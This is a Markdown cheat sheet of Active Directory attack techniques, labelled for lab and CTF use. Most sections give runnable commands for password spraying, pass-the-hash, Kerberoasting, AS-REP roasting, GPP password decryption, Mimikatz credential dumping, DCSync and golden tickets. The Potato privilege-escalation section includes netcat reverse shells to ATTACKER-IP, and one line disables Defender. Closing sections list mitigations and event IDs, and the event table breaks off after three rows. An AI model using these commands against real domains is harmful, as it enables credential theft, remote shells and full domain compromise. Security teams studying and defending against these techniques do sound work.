# 🛡️ Active Directory Security
> **⚠️ LAB USE ONLY** — TryHackMe · Hack The Box · Home Lab · CTF · Authorized Engagements  
> Unauthorized use against real systems is **illegal**. This sheet is for **education & defense**.

---

## 📑 Table of Contents
1. [AD Structure & Account Types](#1-ad-structure--account-types)
2. [Authentication Protocols](#2-authentication-protocols)
3. [Credential Sources](#3-credential-sources)
4. [Enumeration](#4-enumeration)
5. [Pass-the-Password](#5-pass-the-password)
6. [Pass-the-Hash](#6-pass-the-hash)
7. [Kerberoasting](#7-kerberoasting)
8. [AS-REP Roasting](#8-as-rep-roasting)
9. [GPP / cPassword](#9-gpp--cpassword)
10. [Token Impersonation](#10-token-impersonation)
11. [Lateral Movement](#11-lateral-movement)
12. [DCSync](#12-dcsync)
13. [Mimikatz Reference](#13-mimikatz-reference)
14. [Impacket Reference](#14-impacket-reference)
15. [BloodHound / SharpHound](#15-bloodhound--sharphound)
16. [Hash Cracking](#16-hash-cracking)
17. [Defenses & Detections](#17-defenses--detections)
18. [Windows Event ID Reference](#18-windows-event-id-reference)

---

## 1. AD Structure & Account Types

```
Domain Controller (DC)
├── NTDS.dit          ← ALL domain user hashes stored here
├── Kerberos KDC      ← Ticket issuing service
├── LDAP              ← Directory queries
└── SYSVOL            ← Shared policies folder (GPO, scripts)
```

### Account Types

| Type | Scope | Stored In | Notes |
|------|-------|-----------|-------|
| Domain User | Whole domain | NTDS.dit (DC) | e.g. `alice@lab.local` |
| Local User | Single machine | SAM database | e.g. `.\Administrator` |
| Service Account | Domain-wide | NTDS.dit | Has SPNs → Kerberoastable |
| Machine Account | Domain-wide | NTDS.dit | Ends with `$` e.g. `PC-01$` |
| Built-in Admin | Local (RID 500) | SAM | Not filtered by UAC remotely |

```bash
# Enumerate domain users — run on domain-joined Windows machine
net user /domain

# Enumerate local users — run on any Windows target
net user

# List domain admins — from domain-joined machine
net group "Domain Admins" /domain

# Find service accounts via SPN — from domain-joined machine
setspn -T lab.local -Q */*
```

---

## 2. Authentication Protocols

### NTLM Challenge-Response Flow

```
Client                   Server                    DC
  │                        │                        │
  │──── 1. NEGOTIATE ─────▶│                        │
  │◀─── 2. CHALLENGE ───────│  [8-byte random nonce]│
  │                        │                        │
  │  Response = HMAC-MD5(NTLM_Hash, Challenge)      │
  │──── 3. AUTHENTICATE ──▶│                        │
  │     Username + Response│──── 4. VERIFY ────────▶│
  │                        │◀─── 5. PASS/FAIL ───────│
  │◀─── 6. ACCESS ──────────│                        │

KEY: Password never travels the wire — only hash-derived response
     This is WHY Pass-the-Hash works!
```

### Kerberos Ticket Flow

```
Client          KDC (DC)           Service (e.g. SQL)
  │                │                       │
  │── AS-REQ ─────▶│  (encrypted w/ user hash)
  │◀─ AS-REP ──────│  TGT issued (valid 10h)
  │                │                       │
  │── TGS-REQ ────▶│  (presents TGT + SPN request)
  │◀─ TGS-REP ─────│  Service Ticket (encrypted w/ SERVICE ACCOUNT hash)
  │                │                       │
  │── AP-REQ ─────────────────────────────▶│
  │◀─ ACCESS GRANTED ──────────────────────│

KEY: TGS ticket is encrypted with service account's hash
     → Grab ticket → crack offline = Kerberoasting
```

```bash
# Check Kerberos tickets on Windows — current user session
klist

# Purge tickets — useful in labs before re-requesting
klist purge
```

---

## 3. Credential Sources

| Source | Location | Contains | How to Access |
|--------|----------|----------|---------------|
| SAM | `C:\Windows\System32\config\SAM` | Local user NTLM hashes | reg save / shadow copy / secretsdump |
| NTDS.dit | `C:\Windows\NTDS\NTDS.dit` (DC only) | ALL domain hashes | secretsdump / shadow copy on DC |
| LSASS Memory | `lsass.exe` process | Live session hashes + Kerberos tickets | Mimikatz / procdump |
| SYSVOL | `\\domain\SYSVOL\` | GPP cPasswords, scripts | SMB read (any domain user) |
| LSA Secrets | Registry | Service account passwords | secretsdump / Mimikatz lsadump::secrets |

```bash
# Check if VSS (Volume Shadow Copy) exists — on target Windows
vssadmin list shadows

# View SAM & SYSTEM registry hive paths — for offline extraction
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA
```

---

## 4. Enumeration

### 4.1 Basic Windows Commands

```cmd
:: Who am I and what privileges do I have — run first after getting shell
whoami /all

:: Domain info
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

:: Local machine info
net localgroup
net localgroup administrators

:: Domain controller info — from any domain-joined machine
nltest /dclist:lab.local
nslookup -type=SRV _ldap._tcp.lab.local

:: Logged in users on a remote machine — requires admin
query user /server:TARGET
```

### 4.2 PowerView Enumeration

```powershell
# Load PowerView — run in PowerShell on domain-joined machine
Import-Module .\PowerView.ps1
# OR bypass execution policy
powershell -ep bypass -c "Import-Module .\PowerView.ps1"

# ── DOMAIN INFO ──────────────────────────────────────
Get-Domain                        # Basic domain info
Get-DomainController              # Find DCs
Get-DomainPolicy                  # Password policy, lockout policy

# ── USERS ─────────────────────────────────────────────
Get-DomainUser                    # All domain users
Get-DomainUser -Identity alice    # Specific user details
Get-DomainUser -SPN               # Kerberoastable users (have SPNs)
Get-DomainUser -PreauthNotRequired # AS-REP roastable users

# ── GROUPS ────────────────────────────────────────────
Get-DomainGroup                   # All groups
Get-DomainGroup "Domain Admins"   # Specific group
Get-DomainGroupMember "Domain Admins"  # Members of DA group

# ── COMPUTERS ─────────────────────────────────────────
Get-DomainComputer                               # All computers
Get-DomainComputer -OperatingSystem "*Server*"  # Only servers
Get-DomainComputer -Ping                         # Only alive ones

# ── SHARES ────────────────────────────────────────────
Invoke-ShareFinder                # Find all readable shares in domain
Find-DomainShare -CheckShareAccess # Only accessible ones

# ── GPO ───────────────────────────────────────────────
Get-DomainGPO                     # All GPOs
Get-DomainGPOLocalGroup           # Local admins set via GPO (useful!)
Get-GPPPassword                   # Find cPasswords in SYSVOL

# ── ACL (Permissions) ─────────────────────────────────
Get-ObjectAcl -Identity "alice"          # Alice's ACL permissions
Find-InterestingDomainAcl                # Misconfigured ACLs
Get-DomainObjectAcl -Identity "DC01"     # DC object permissions

# ── SESSIONS ──────────────────────────────────────────
Get-NetSession -ComputerName dc01        # Who is logged into DC
Find-DomainUserLocation                  # Where are DA users logged in

# ── TRUST ─────────────────────────────────────────────
Get-DomainTrust                   # Domain trust relationships
```

### 4.3 LDAP Enumeration (Linux)

```bash
# Anonymous LDAP query — test if anonymous bind works
ldapsearch -x -H ldap://DC-IP -b "DC=lab,DC=local"

# Authenticated LDAP query — with valid credentials
ldapsearch -x -H ldap://DC-IP -D "alice@lab.local" -w "Password123" \
  -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName

# Find all users with SPNs — for Kerberoasting targets
ldapsearch -x -H ldap://DC-IP -D "alice@lab.local" -w "Password123" \
  -b "DC=lab,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

---

## 5. Pass-the-Password

```
Concept: Same local admin password on multiple machines
         → One compromise = lateral movement everywhere

Flow:
[Attacker] ──── SMB ──── [PC-BOB]
           Username: Administrator
           Password: Summer2023!   ← same password as PC-Alice
           → ACCESS GRANTED
```

### 5.1 CrackMapExec (CME) — Network Sweep

```bash
# Spray one password across a subnet — run from Kali/attack box
# Replace DOMAIN, USER, PASSWORD, and IP range with lab values
crackmapexec smb 192.168.1.0/24 -u Administrator -p "Summer2023!"

# Domain user spray — when you have domain creds
crackmapexec smb 192.168.1.0/24 -u alice -p "Password123" -d lab.local

# Run a command on all successful targets
crackmapexec smb 192.168.1.0/24 -u Administrator -p "Summer2023!" \
  -x "whoami"

# Dump SAM on all targets where login succeeds — requires admin
crackmapexec smb 192.168.1.0/24 -u Administrator -p "Summer2023!" \
  --sam

# List shares — enumerate readable shares
crackmapexec smb TARGET-IP -u alice -p "Password123" --shares

# OUTPUT READING:
# [+] ... (Pwn3d!)  = Admin access, can run commands
# [+] ...           = Valid creds but not admin
# [-] ...           = Invalid credentials
# [*] ...           = Info message
```

### 5.2 smbclient

```bash
# List all shares — quick reconnaissance
smbclient -L //TARGET-IP -U "alice%Password123"

# Connect to a specific share
smbclient //TARGET-IP/C$ -U "Administrator%Summer2023!"

# Inside smbclient — file operations
ls                          # list files
get filename.txt            # download file
put localfile.txt           # upload file
cd "Users\alice\Desktop"    # navigate
```

---

## 6. Pass-the-Hash

```
Concept: NTLM hash itself acts as the password
         No need to crack the hash — use it directly

Format:  LM_HASH:NT_HASH
Example: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
                                          └──────── This part matters ────┘

Works because: NTLM auth uses Hash(Challenge) — not Password(Challenge)
               So providing hash directly = same result
```

### 6.1 CME — Pass-the-Hash

```bash
# PtH sweep across subnet — -H flag takes NT hash only
crackmapexec smb 192.168.1.0/24 -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Short form — just NT hash works
crackmapexec smb 192.168.1.0/24 -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c

# Execute command with hash
crackmapexec smb TARGET-IP -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c -x "ipconfig"

# WinRM PtH — if port 5985 open
crackmapexec winrm TARGET-IP -u alice \
  -H 8846f7eaee8fb117ad06bdd830b7586c
```

### 6.2 Impacket psexec / smbexec

```bash
# psexec — spawns SYSTEM shell via service creation
# Use when: SMB open + admin credentials available
python3 psexec.py -hashes :NT_HASH administrator@TARGET-IP

# smbexec — stealthier, no binary drop (output via share)
# Use when: AV might flag psexec binary
python3 smbexec.py -hashes :NT_HASH administrator@TARGET-IP

# wmiexec — uses WMI, less noisy than psexec
# Use when: WMI port open (135), fewer artifacts
python3 wmiexec.py -hashes :NT_HASH administrator@TARGET-IP

# atexec — executes via Task Scheduler
python3 atexec.py -hashes :NT_HASH administrator@TARGET-IP "whoami"
```

### 6.3 evil-winrm — PtH via WinRM

```bash
# Connect with hash — port 5985 must be open
# Use when: Target has WinRM enabled, user in Remote Mgmt group
evil-winrm -i TARGET-IP -u alice -H NT_HASH

# Upload / download files inside evil-winrm session
upload /local/path/file.exe
download C:\Users\alice\file.txt

# Load PowerShell scripts inside session
menu                          # show built-in modules
Invoke-BloodHound             # if module loaded
```

### 6.4 PtH Limitations

```
FAILS when:
├── SMB Signing = Required        → relay attacks blocked
├── Credential Guard enabled      → hash dump prevented  
├── Protected Users group         → NTLM auth disabled for user
├── Local account + UAC filtering → filtered token (not full admin)
│   EXCEPTION: RID 500 (built-in Administrator) bypasses UAC filter!
└── Network-level firewall        → port 445/5985 blocked

CHECK SMB SIGNING:
crackmapexec smb TARGET-IP --gen-relay-list relay_targets.txt
# Targets without signing go into relay_targets.txt
```

---

## 7. Kerberoasting

```
Concept: Any domain user can request TGS tickets for SPNs
         TGS ticket encrypted with service account's NTLM hash
         → Save ticket → Crack offline → Get service account password

Risk: Service accounts often have weak passwords + rarely rotated
      If high-privilege → path to Domain Admin!

Requirements: Valid domain credentials (any low-priv user)
```

### 7.1 Find Kerberoastable Accounts

```bash
# From Linux — list all accounts with SPNs
# Use when: You have valid domain credentials, want to find targets
python3 GetUserSPNs.py lab.local/alice:Password123 -dc-ip DC-IP

# OUTPUT:
# ServicePrincipalName              Name     MemberOf      PasswordLastSet
# ────────────────────────────────────────────────────────────────────────
# MSSQLSvc/sql.lab.local:1433       svc-sql  DB-Admins     2020-01-01
# HTTP/iis.lab.local                svc-iis  Domain Users  2019-06-15

# From Windows — PowerView
# Use when: On domain-joined machine
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
```

### 7.2 Request & Save TGS Tickets

```bash
# Request tickets AND output as hashcat-ready format
# -request flag pulls the tickets, -outputfile saves them
python3 GetUserSPNs.py lab.local/alice:Password123 \
  -dc-ip DC-IP -request -outputfile kerberoast_hashes.txt

# From Windows — Invoke-Kerberoast (PowerView)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | \
  Out-File -FilePath kerberoast.txt -Encoding ASCII

# From Windows — Rubeus
# Use when: Want in-memory operation, no disk writes preferred
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc-sql /outfile:svc-sql.txt  # specific user
```

### 7.3 Crack the Tickets

```bash
# Hashcat — mode 13100 = Kerberos TGS-REP (RC4)
# -a 0 = dictionary attack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules — increases hit rate
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper alternative
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Hash format looks like:
# $krb5tgs$23$*svc-sql$LAB.LOCAL$MSSQLSvc/sql.lab.local*$A3F9...
```

---

## 8. AS-REP Roasting

```
Concept: If "Do not require Kerberos preauthentication" is set on a user
         → You can request AS-REP without their password
         → AS-REP encrypted with user's hash → crack offline

Different from Kerberoasting:
  Kerberoast = needs valid creds → targets SERVICE accounts
  AS-REP     = no creds needed  → targets USER accounts with flag set
```

### 8.1 Find Vulnerable Users

```bash
# From Linux — no credentials needed if users are vulnerable
python3 GetNPUsers.py lab.local/ -dc-ip DC-IP -no-pass -usersfile users.txt

# With credentials — enumerate first then attack
python3 GetNPUsers.py lab.local/alice:Password123 -dc-ip DC-IP -request

# From Windows — PowerView
Get-DomainUser -PreauthNotRequired | Select SamAccountName
```

### 8.2 Crack AS-REP Hashes

```bash
# Hashcat — mode 18200 = Kerberos AS-REP
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hash format:
# $krb5asrep$23$bob@LAB.LOCAL:A3F9...
```

---

## 9. GPP / cPassword

```
Concept: Old Group Policy Preferences stored passwords in SYSVOL
         SYSVOL readable by ALL domain users
         Microsoft published the AES key → trivial to decrypt!

Affected: Windows Server 2003–2012 era environments
          Legacy environments STILL have these files!

Files to check: Groups.xml, Services.xml, 
                ScheduledTasks.xml, DataSources.xml
```

### 9.1 Find cPassword Files

```bash
# From Linux — manual search via SMB
smbclient //DC-IP/SYSVOL -U "alice%Password123"
# Then: ls, cd, find Groups.xml manually

# From Linux — automated with Impacket
python3 Get-GPPPassword.py lab.local/alice:Password123 -dc-ip DC-IP

# From Windows — manual findstr
findstr /S /I cpassword \\lab.local\sysvol\*.xml

# From Windows — PowerView (automated)
Get-GPPPassword

# From Metasploit (lab)
use post/windows/gather/credentials/gpp
```

### 9.2 Decrypt cPassword

```bash
# gpp-decrypt — comes pre-installed on Kali
# Input: the cpassword value from Groups.xml
gpp-decrypt VPe/o9YRyzJFpP45ukuAIA

# OUTPUT: GPPstillStandingStrong2k18

# Python manual decrypt (if gpp-decrypt not available)
python3 -c "
import base64, hashlib
from Crypto.Cipher import AES

key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
cpass = 'VPe/o9YRyzJFpP45ukuAIA=='
data = base64.b64decode(cpass + '==')
cipher = AES.new(key, AES.MODE_CBC, data[:16])
print(cipher.decrypt(data[16:]).decode().strip())
"
```

---

## 10. Token Impersonation

```
Concept: Windows assigns Access Tokens to processes
         Delegation tokens of other users may be in memory
         SeImpersonatePrivilege → steal SYSTEM token

Common Scenario:
  You get IIS shell / SQL xp_cmdshell (Network Service / IIS AppPool)
  These accounts have SeImpersonatePrivilege by default
  → Escalate to SYSTEM via Potato attacks
```

### 10.1 Check Privileges

```cmd
:: Check current privileges — look for SeImpersonatePrivilege
whoami /priv

:: Good to see:
:: SeImpersonatePrivilege    Impersonate a client after auth    Enabled
:: SeAssignPrimaryTokenPriv  Replace a process-level token      Enabled
```

### 10.2 Potato Attacks (SeImpersonatePrivilege Abuse)

```bash
# PrintSpoofer — Windows 10 / Server 2016, 2019
# Use when: SeImpersonatePrivilege present, Windows 10/Server 2016+
PrintSpoofer.exe -i -c cmd     # interactive SYSTEM cmd
PrintSpoofer.exe -c "nc.exe ATTACKER-IP 4444 -e cmd"  # reverse shell

# RoguePotato — Server 2019 / Windows 10 newer builds
# Use when: PrintSpoofer doesn't work
RoguePotato.exe -r ATTACKER-IP -e "nc.exe ATTACKER-IP 4444 -e cmd" -l 9999

# JuicyPotato — older systems (pre Server 2019)
# Use when: Older Windows Server / Windows 7–8
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{CLSID}"

# GodPotato — works on Server 2012–2022
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c nc.exe ATTACKER-IP 4444 -e cmd"
```

### 10.3 Incognito (Metasploit)

```bash
# Load incognito module after getting meterpreter session
# Use when: meterpreter session, other users logged on to target
load incognito

list_tokens -u          # list available user tokens
list_tokens -g          # list available group tokens

# Impersonate a specific token
impersonate_token "LAB\\Administrator"

# Verify
getuid

# Revert back to original token
rev2self
```

---

## 11. Lateral Movement

### 11.1 PsExec

```bash
# Impacket psexec — spawns SYSTEM shell
# Use when: Port 445 open, admin credentials available
python3 psexec.py lab.local/administrator:Password123@TARGET-IP
python3 psexec.py -hashes :NT_HASH administrator@TARGET-IP

# Sysinternals PsExec (from Windows)
PsExec.exe \\TARGET -u administrator -p Password123 cmd
PsExec.exe \\TARGET -u administrator -p Password123 -s cmd  # SYSTEM

# ARTIFACTS CREATED (for defenders):
# - ADMIN$ share write
# - PSEXECSVC service installed temporarily
# Event ID 7045 — New service created
```

### 11.2 WMI Execution

```bash
# Impacket wmiexec — semi-interactive shell via WMI
# Use when: WMI available (port 135), fewer forensic artifacts than psexec
python3 wmiexec.py lab.local/alice:Password123@TARGET-IP
python3 wmiexec.py -hashes :NT_HASH administrator@TARGET-IP

# From Windows — wmic command
wmic /node:TARGET-IP /user:administrator /password:Password123 \
  process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell WMI
Invoke-WmiMethod -Class Win32_Process -Name Create \
  -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET
```

### 11.3 WinRM / evil-winrm

```bash
# evil-winrm — best interactive shell for WinRM
# Use when: Port 5985 open, user in Remote Management Users
evil-winrm -i TARGET-IP -u alice -p "Password123"
evil-winrm -i TARGET-IP -u alice -H NT_HASH         # PtH

# PowerShell remoting (from Windows)
# Requires: WinRM enabled, proper permissions
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Non-interactive command
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami} \
  -Credential (Get-Credential)
```

### 11.4 RDP

```bash
# From Linux — xfreerdp
# Use when: Port 3389 open, GUI needed, user in Remote Desktop Users
xfreerdp /u:alice /p:Password123 /v:TARGET-IP
xfreerdp /u:alice /pth:NT_HASH /v:TARGET-IP          # PtH (RDP)
xfreerdp /u:alice /p:Password123 /v:TARGET-IP /cert-ignore

# Enable RDP remotely (if admin access via other method)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" \
  /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### 11.5 SMB File Operations

```bash
# Mount SMB share — useful for file transfer / browsing
# Use when: Need to read/write files on remote share
smbclient //TARGET-IP/C$ -U "administrator%Password123"
smbclient //TARGET-IP/Share -U "alice%Password123"

# Mount on Linux
sudo mount -t cifs //TARGET-IP/Share /mnt/target \
  -o username=alice,password=Password123,domain=lab.local

# CME file operations
crackmapexec smb TARGET-IP -u alice -p Password123 \
  --get-file "C:\Users\alice\flag.txt" ./flag.txt
```

---

## 12. DCSync

```
Concept: Domain Controllers replicate with each other using MS-DRSR
         Certain AD rights (Replicating Directory Changes) allow
         any account to pull password hashes like a DC would
         
Required Rights (any one):
  - Replicating Directory Changes
  - Replicating Directory Changes All  
  - Domain Admins / Enterprise Admins (have these by default)

Use Case: When you compromise an account with these rights
          → Dump ALL domain hashes without touching DC disk
```

### 12.1 DCSync with secretsdump

```bash
# Pull specific user hash — target krbtgt for Golden Ticket
# Use when: Compromised account has replication rights
python3 secretsdump.py lab.local/administrator:Password123@DC-IP

# With hash
python3 secretsdump.py -hashes :NT_HASH administrator@DC-IP

# Just NTDS secrets (faster, less noise)
python3 secretsdump.py -just-dc lab.local/administrator:Password123@DC-IP

# Specific user only
python3 secretsdump.py -just-dc-user krbtgt \
  lab.local/administrator:Password123@DC-IP

# OUTPUT FORMAT:
# krbtgt:502:LM_HASH:NT_HASH:::     ← krbtgt hash (Golden Ticket!)
# administrator:500:LM_HASH:NT_HASH:::
# alice:1104:LM_HASH:NT_HASH:::
```

### 12.2 DCSync with Mimikatz

```cmd
:: Run from machine with domain admin OR replication rights
:: Use when: On Windows machine, have high-priv access
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /user:administrator
mimikatz # lsadump::dcsync /domain:lab.local /all  :: DUMP ALL (noisy!)
```

---

## 13. Mimikatz Reference

> ⚠️ Requires elevated privileges. Run as Administrator or SYSTEM.  
> AV will flag this — disable Defender in lab: `Set-MpPreference -DisableRealtimeMonitoring $true`

### 13.1 Setup

```cmd
:: Always run first — enables debug privilege for LSASS access
privilege::debug

:: Expected output: Privilege '20' OK
:: If fails: Not running as admin/SYSTEM
```

### 13.2 LSASS Credential Dump

```cmd
:: Dump all logged-in user credentials from LSASS
:: Use when: Admin/SYSTEM shell, want live session creds
sekurlsa::logonpasswords

:: OUTPUT FIELDS:
:: Username  = account name
:: Domain    = domain or machine name
:: NTLM      = hash for PtH attacks ← what you want
:: Password  = plaintext (only if WDigest enabled)

:: Dump Kerberos tickets from LSASS
sekurlsa::tickets

:: Export Kerberos tickets to files
sekurlsa::tickets /export

:: Pass-the-Hash directly from Mimikatz
sekurlsa::pth /user:administrator /domain:lab.local \
  /ntlm:NT_HASH /run:cmd.exe
```

### 13.3 SAM & LSA Dump

```cmd
:: Dump SAM local hashes — requires SYSTEM
:: Use when: On local machine, want local account hashes
lsadump::sam

:: Dump LSA secrets (service account passwords, cached creds)
lsadump::lsa /patch
lsadump::secrets

:: DCSync (domain replication pull)
lsadump::dcsync /user:krbtgt /domain:lab.local
lsadump::dcsync /all /domain:lab.local
```

### 13.4 Kerberos Operations

```cmd
:: List current Kerberos tickets
kerberos::list

:: Pass-the-Ticket — inject .kirbi ticket file
kerberos::ptt ticket.kirbi

:: Golden Ticket — requires krbtgt hash
:: Use when: You have krbtgt hash → persistence + full domain access
kerberos::golden /user:fakeboss /domain:lab.local \
  /sid:DOMAIN-SID /krbtgt:KRBTGT_HASH \
  /id:500 /groups:512 /ptt

:: Silver Ticket — requires service account hash
kerberos::silver /user:alice /domain:lab.local \
  /sid:DOMAIN-SID /target:sql.lab.local \
  /service:cifs /rc4:SERVICE_HASH /ptt
```

### 13.5 Token Operations

```cmd
:: List available tokens
token::list

:: Elevate to SYSTEM token
token::elevate

:: Impersonate a specific user token
token::elevate /domainadmin

:: Revert to original token
token::revert
```

---

## 14. Impacket Reference

> Python toolkit — run from Kali/Linux  
> Install: `pip3 install impacket`  
> Scripts in: `/usr/share/doc/python3-impacket/examples/`

```bash
# ── CREDENTIAL DUMPING ────────────────────────────────────────

# secretsdump — dump all credential sources remotely
# Use when: Admin creds available, want hashes without touching target
python3 secretsdump.py DOMAIN/user:password@TARGET-IP
python3 secretsdump.py -hashes :NT_HASH user@TARGET-IP
python3 secretsdump.py -just-dc DOMAIN/user:password@DC-IP   # NTDS only

# ── KERBEROS ATTACKS ──────────────────────────────────────────

# GetUserSPNs — Kerberoasting
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip DC-IP -request

# GetNPUsers — AS-REP Roasting
python3 GetNPUsers.py DOMAIN/user:password -dc-ip DC-IP -request
python3 GetNPUsers.py DOMAIN/ -dc-ip DC-IP -no-pass -usersfile users.txt

# ── REMOTE EXECUTION ──────────────────────────────────────────

# psexec — SYSTEM shell via service
python3 psexec.py DOMAIN/user:password@TARGET-IP
python3 psexec.py -hashes :NT_HASH user@TARGET-IP

# smbexec — no binary drop, uses SMB share output
python3 smbexec.py DOMAIN/user:password@TARGET-IP

# wmiexec — WMI execution
python3 wmiexec.py DOMAIN/user:password@TARGET-IP

# atexec — Task Scheduler execution
python3 atexec.py DOMAIN/user:password@TARGET-IP "whoami"

# ── SMB / SHARES ──────────────────────────────────────────────

# smbclient — interactive share browser
python3 smbclient.py DOMAIN/user:password@TARGET-IP

# ── LDAP ──────────────────────────────────────────────────────

# ldapdomaindump — dump all AD info to HTML/JSON
python3 ldapdomaindump.py -u DOMAIN\\user -p password DC-IP
```

---

## 15. BloodHound / SharpHound

### 15.1 SharpHound Data Collection

```powershell
# Run SharpHound on domain-joined Windows machine
# All collection: users, groups, computers, sessions, ACLs, GPOs
SharpHound.exe -c All

# Stealth mode — DC only, less noise
SharpHound.exe -c DCOnly

# Specific domain
SharpHound.exe -c All -d lab.local

# With credentials (run as different user)
SharpHound.exe -c All --ldapusername alice --ldappassword Password123

# Output: ZIP file → import into BloodHound GUI
```

```bash
# From Linux — bloodhound-python (no Windows needed!)
# Use when: You have creds but no shell, or prefer Linux workflow
pip3 install bloodhound
bloodhound-python -u alice -p Password123 -d lab.local \
  -dc DC-IP -c All

# Output: JSON files → zip them → import into BloodHound
```

### 15.2 BloodHound Setup (Linux)

```bash
# Start Neo4j database (required backend)
sudo neo4j start
# Open: http://localhost:7474 — change default password!

# Start BloodHound GUI
bloodhound &

# Import: Drag & drop ZIP file into BloodHound interface
```

### 15.3 Key BloodHound Queries

```
# In BloodHound search bar / Analysis tab:

Find all Domain Admins
→ See who has DA

Shortest Paths to Domain Admins
→ How to get from current user to DA

Find Principals with DCSync Rights
→ Who can dump all hashes

Find Computers where Domain Users are Local Admin
→ Quick wins for initial foothold

Shortest Paths from Kerberoastable Users
→ What can you reach after cracking SPN accounts

Find AS-REP Roastable Users
→ No-creds attack targets

Shortest Paths to Unconstrained Delegation Systems
→ Delegation abuse paths

Find Computers with Unsupported Operating Systems
→ Easy targets (WinXP, Win7, Server 2003)
```

---

## 16. Hash Cracking

```bash
# ── IDENTIFY HASH TYPE ────────────────────────────────────────
hashid HASH_HERE
hash-identifier HASH_HERE

# ── NTLM HASH (from SAM / NTDS / LSASS) ──────────────────────
# Mode 1000 = NTLM
# Use when: You have NT hash from secretsdump / Mimikatz
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# ── KERBEROAST TGS (RC4 / Type 23) ───────────────────────────
# Mode 13100 = Kerberos TGS-REP etype 23
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# ── AS-REP ROAST ──────────────────────────────────────────────
# Mode 18200 = Kerberos AS-REP etype 23
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# ── NET-NTLM v2 (captured via Responder) ─────────────────────
# Mode 5600 = NetNTLMv2
hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt

# ── USEFUL FLAGS ──────────────────────────────────────────────
--show                          # show already cracked
--username                      # input has username:hash format
-O                              # optimized kernels (faster)
--status                        # show live status
-w 3                            # high workload (use when no GUI)

# ── JOHN THE RIPPER ───────────────────────────────────────────
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=nt hashes.txt --wordlist=rockyou.txt    # NTLM
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt  # Kerberoast
john hashes.txt --show                                # see results
```

---

## 17. Defenses & Detections

### 17.1 Mitigations Summary

| Attack | Mitigation | Implementation |
|--------|-----------|----------------|
| Pass-the-Hash | Credential Guard | Enable VBS in Windows 10/11 Enterprise |
| Pass-the-Hash | Protected Users group | Add sensitive users to Protected Users AD group |
| Pass-the-Password | LAPS | Deploy Microsoft LAPS via GPO |
| PtH / PtP lateral | SMB Signing | GPO: `Microsoft network server: Digitally sign communications` |
| Kerberoasting | Strong service passwords | 25+ char random passwords or gMSA |
| Kerberoasting | Use gMSA | Auto-rotating 120-char passwords, no cracking possible |
| LSASS dumping | RunAsPPL | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RunAsPPL = 1` |
| LSASS dumping | Credential Guard | VBS-protected LSASS memory |
| GPP cPassword | MS14-025 + SYSVOL audit | Patch + remove old Groups.xml files |
| Token impersonation | Least privilege | Don't run web apps as SYSTEM or high-priv accounts |
| DCSync | Audit replication rights | Review who has `Replicating Directory Changes` |
| Enumeration | Tiered admin model | Separate DA, server admin, workstation admin accounts |

### 17.2 Quick Hardening Commands

```powershell
# Enable SMB Signing — run on Domain Controller via GPO or directly
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true

# Disable NTLM (advanced — test first, may break things)
# GPO: Computer Config → Windows Settings → Security Settings
# → Local Policies → Security Options
# → "Network security: Restrict NTLM: Incoming NTLM traffic"

# Enable LSASS protection (PPL)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" -Value 1

# Disable WDigest (cleartext passwords in LSASS)
# Should already be disabled on patched systems, verify:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
  -Name "UseLogonCredential" -Value 0

# Add user to Protected Users group — prevents NTLM, forces Kerberos
Add-ADGroupMember -Identity "Protected Users" -Members "alice","bob","svc-sql"

# Find accounts with unconstrained delegation (risky)
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties *
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties *
```

---

## 18. Windows Event ID Reference

### Critical Event IDs

| Event ID | Log | Triggered By | What to Look For |
|----------|-----|-------------|-----------------|
| **4624** | Security | Successful logon | Logon Type 3 (Network) from unexpected IPs |
| **4625** | Security | Failed logon | Rapid failures = spray attack |
| **4648** | Security | Explicit credential logon | RunAs / lateral movement |
